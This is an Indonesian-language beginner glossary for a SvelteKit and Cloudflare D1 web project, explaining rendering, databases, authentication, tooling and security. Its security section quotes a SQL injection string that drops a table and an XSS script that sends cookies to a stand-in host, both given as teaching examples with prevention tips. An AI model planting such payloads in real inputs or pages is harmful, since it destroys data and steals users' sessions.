# Glossary - Istilah & Konsep

Daftar istilah teknis yang digunakan dalam project ini, dijelaskan dengan sederhana untuk pemula.

---

## 🌐 Web Development Basics

### Edge / Edge Computing
**Penjelasan Sederhana:** Server yang ditempatkan di lokasi fisik dekat dengan user, bukan di satu data center pusat.

**Analogi:** Seperti membuka cabang toko di berbagai kota, bukan hanya di pusat kota.

**Kenapa Penting:**
- Website lebih cepat diakses
- Lower latency (waktu tunggu lebih singkat)
- Lebih murah untuk traffic global

**Contoh:** Cloudflare punya 300+ lokasi server di seluruh dunia. User Indonesia akses server di Jakarta, bukan ke US.

---

### Server-Side Rendering (SSR)
**Penjelasan Sederhana:** Server yang membuat HTML lengkap sebelum dikirim ke browser.

**Analogi:** Restoran yang sudah siapkan makanan sebelum tamu datang, bukan bikin dari nol saat pesan.

**Kenapa Penting:**
- SEO lebih baik (Google bisa baca konten)
- First paint lebih cepat
- Works tanpa JavaScript

---

### Client-Side Rendering (CSR)
**Penjelasan Sederhana:** Browser yang membuat HTML menggunakan JavaScript setelah menerima data.

**Analogi:** IKEA - dikirim flatpack, user rakit sendiri di rumah.

**Kenapa Penting:**
- Interaktif setelah load
- Navigation cepat (SPA feel)
- Tapi butuh JavaScript & SEO lebih sulit

---

## 🗄️ Database

### D1 (Cloudflare D1)
**Penjelasan Sederhana:** Database SQLite yang berjalan di edge network Cloudflare.

**Kenapa SQLite?** 
- Simple, file-based
- Tidak perlu server database terpisah
- Cukup untuk 90% aplikasi web

**Kenapa di Edge?**
- Query di lokasi terdekat dengan user
- Replicate otomatis ke 300+ lokasi

**Batasan:**
- Max 500MB (free tier)
- Bukan untuk Big Data
- Write lebih lambat dari read

---

### ORM (Object-Relational Mapping)
**Penjelasan Sederhana:** Library yang mengubah kode JavaScript/TypeScript menjadi SQL query.

**Tanpa ORM:**
```javascript
// Raw SQL - berisiko SQL injection
db.query("SELECT * FROM users WHERE id = " + userId)
```

**Dengan ORM (Drizzle):**
```typescript
// Type-safe, auto-completion
await db.select().from(users).where(eq(users.id, userId))
```

**Kenapa Pakai ORM:**
- Type safety
- Auto-completion di editor
- Query builder (tidak perlu ingat syntax SQL)
- Anti SQL injection

---

### Migration
**Penjelasan Sederhana:** Script yang mengubah struktur database secara terkontrol.

**Contoh Flow:**
1. Developer tambah kolom "bio" di schema
2. Generate migration: `npm run db:generate`
3. Apply migration: `npm run db:migrate`
4. Database sekarang punya kolom "bio"

**Kenapa Penting:**
- Version control untuk database
- Tim bisa sync struktur database
- Rollback kalau ada masalah

---

## 🔐 Authentication

### Session-Based Auth
**Penjelasan Sederhana:** Server menyimpan data login user di memory/database, browser menyimpan ID session di cookie.

**Flow:**
1. User login → Server buat session → Kirim session ID ke browser
2. Browser simpan di cookie
3. Request berikutnya → Browser kirim cookie → Server cek session valid

**vs JWT:**
- Session: Data di server, cookie hanya ID
- JWT: Semua data di token, server tidak simpan apa-apa

**Kenapa Session dipilih:**
- Bisa revoke (logout) langsung
- Lebih aman untuk web app
- Simpler untuk server-rendered apps

---

### OAuth (Open Authorization)
**Penjelasan Sederhana:** Login pakai akun third-party (Google, GitHub, etc).

**Flow Sederhana:**
1. User klik "Login with Google"
2. Diarahkan ke Google
3. Google tanya: "App X mau akses data Anda?"
4. User approve → Google kirim token ke App
5. App gunakan token untuk ambil data user

**Kenapa Penting:**
- User tidak perlu buat password baru
- Leverage security Google/GitHub
- Faster onboarding

---

## 🎨 Frontend

### SvelteKit
**Penjelasan Sederhana:** Framework untuk bikin web app dengan approach "less code, more output".

**Kenapa Svelte Beda:**
- Tidak pakai Virtual DOM (lebih cepat)
- Compile-time optimization
- Less boilerplate code

**File-based Routing:**
- `/src/routes/about/+page.svelte` → URL `/about`
- `/src/routes/blog/[slug]/+page.svelte` → URL `/blog/hello-world`

---

### Server Load vs Client Fetch
**Perbedaan Fundamental:**

| Server Load | Client Fetch |
|-------------|--------------|
| Data di-fetch saat server render page | Data di-fetch setelah page load di browser |
| 1 request (HTML langsung lengkap) | 2 request (HTML + API call) |
| SEO friendly | Butuh loading state |
| User lihat data langsung | User lihat spinner dulu |

**Kapan Pakai Server Load:**
- Data yang selalu dibutuhkan (user profile, list items)
- SEO penting (blog, product pages)

**Kapan Pakai Client Fetch:**
- Data yang terlalu besar untuk SSR
- Real-time updates
- User-specific data setelah interaction

---

### Form Actions
**Penjelasan Sederhana:** Cara SvelteKit handle form submission tanpa JavaScript.

**Traditional (JavaScript Required):**
```html
<form on:submit={handleSubmit}>
  <!-- Won't work without JS -->
</form>
```

**SvelteKit Form Actions:**
```html
<form method="POST" action="?/createPost">
  <!-- Works even without JavaScript! -->
</form>
```

**Kenapa Penting:**
- Progressive enhancement
- Works tanpa JS (accessibility)
- Lebih simple untuk basic CRUD

---

## 🏗️ Architecture

### Monolith vs Microservices
**Project ini: Monolith**
- Satu codebase untuk semua
- Database, API, frontend satu repo
- Lebih simple untuk small-medium apps

**Microservices (tidak dipakai di sini):**
- Setiap service di repo terpisah
- Database terpisah per service
- Complex, untuk large scale

---

### MVC Pattern
**Model-View-Controller** - Pattern pemisahan concerns:

**Model:** Data & business logic
- Schema database (Drizzle)
- Database queries

**View:** UI presentation
- Svelte components (.svelte files)
- HTML + CSS + JavaScript

**Controller:** Request handling
- SvelteKit routes (+page.server.ts)
- API endpoints (+server.ts)

**Kenapa Dipisah:**
- Code lebih terorganisir
- Testing lebih mudah
- Team bisa kerja paralel

---

## ⚡ Performance

### Lazy Loading
**Penjelasan Sederhana:** Load resource hanya ketika dibutuhkan.

**Contoh:**
- Gambar di bawah fold → Load saat user scroll
- Modal component → Load saat user klik tombol
- Admin panel → Load hanya untuk admin users

---

### Code Splitting
**Penjelasan Sederhana:** Memecah JavaScript bundle menjadi chunk kecil.

**Tanpa Code Splitting:**
- User download 500KB JS untuk semua halaman
- Padahal halaman ini hanya butuh 50KB

**Dengan Code Splitting:**
- Halaman A: Download 50KB
- Halaman B: Download 60KB (on navigate)
- Initial load lebih cepat

---

## 🔒 Security

### SQL Injection
**Penjelasan Sederhana:** Hacker masukkan SQL code ke input form untuk akses database ilegal.

**Contoh Serangan:**
```
Input: '; DROP TABLE users; --
Query: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
Result: Table users dihapus!
```

**Pencegahan:**
- Pakai ORM (Drizzle sudah escape otomatis)
- Never concatenate user input ke SQL
- Parameterized queries

---

### XSS (Cross-Site Scripting)
**Penjelasan Sederhana:** Hacker inject JavaScript ke website untuk steal data user.

**Contoh:**
```html
Komentar: <script>document.location='hacker.com?cookie='+document.cookie</script>
```

**Pencegahan:**
- Escape output ({@html} di Svelte hati-hati)
- Content Security Policy (CSP)
- Sanitize user input

---

### CSRF (Cross-Site Request Forgery)
**Penjelasan Sederhana:** Hacker pakai session user yang sudah login untuk akses tanpa izin.

**Contoh:**
- User login ke bank.com
- User visit evil.com
- evil.com kirim request ke bank.com/transfer
- Bank kira user yang request

**Pencegahan:**
- CSRF tokens
- SameSite cookies
- Validate Origin header

---

## 🛠️ Tools & Ecosystem

### Wrangler
**Penjelasan Sederhana:** CLI tool dari Cloudflare untuk manage services mereka.

**Gunanya:**
- Deploy ke Cloudflare Pages
- Manage D1 database
- Manage Workers (edge functions)
- Local development dengan Cloudflare environment

---

### Vite
**Penjelasan Sederhana:** Build tool yang super cepat untuk development.

**Kenapa Cepat:**
- Native ES modules (tidak perlu bundle tiap save)
- Hot Module Replacement (HMR) instan
- On-demand compilation

**vs Webpack:**
- Vite: Dev server start < 1 detik
- Webpack: Dev server start 10-30 detik

---

### TypeScript
**Penjelasan Sederhana:** JavaScript dengan type checking.

**Tanpa TypeScript:**
```javascript
function add(a, b) {
  return a + b; // a dan b bisa apa saja
}
add("1", 2); // "12" (string concatenation!)
```

**Dengan TypeScript:**
```typescript
function add(a: number, b: number): number {
  return a + b;
}
add("1", 2); // ❌ Error: Argument of type 'string' not assignable
```

**Kenapa Penting:**
- Catch bugs sebelum runtime
- Auto-completion di editor
- Dokumentasi otomatis

---

## 📚 Resources untuk Belajar

### Untuk Pemula
- [Svelte Tutorial](https://svelte.dev/tutorial) - Interactive learning
- [JavaScript.info](https://javascript.info/) - Fundamental JS
- [SQLBolt](https://sqlbolt.com/) - Learn SQL

### Untuk Intermediate
- [SvelteKit Docs](https://kit.svelte.dev/docs)
- [Drizzle ORM Docs](https://orm.drizzle.team/docs)
- [Cloudflare D1 Docs](https://developers.cloudflare.com/d1/)

### Untuk Advanced
- [Lucia Auth Deep Dive](https://lucia-auth.com/)
- [Web Security](https://web.dev/secure/)
- [Edge Computing Patterns](https://developers.cloudflare.com/workers/)

---

**💡 Tips:** Kalau ada istilah lain yang belum dipahami, tambahkan issue di GitHub atau tanyakan di Discord!
